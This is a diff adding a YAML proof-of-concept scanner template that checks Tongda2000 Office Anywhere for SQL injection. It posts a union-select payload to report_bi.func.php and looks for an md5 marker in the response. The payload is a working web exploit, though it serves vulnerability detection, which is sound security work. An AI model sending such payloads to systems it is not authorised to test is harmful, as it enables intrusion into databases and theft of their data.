@@ -1,0 +1,22 @@
+name: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-416624
+binding: 75eec3e3-694b-4f70-be81-bd5b6b932fb9
+detail:
+    author: system_user
+    vulnerability:
+        id: eee725f2-dd28-404e-84b7-b1ff7eeac653
+        level: high
+transport: http
+set:
+    f1: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /general/bi_design/appcenter/report_bi.func.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: _POST[dataset_id]=efgh'-@`'`)union+select+1,2,md5({{f1}})#'&action=get_link_info
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
+expression: r0()
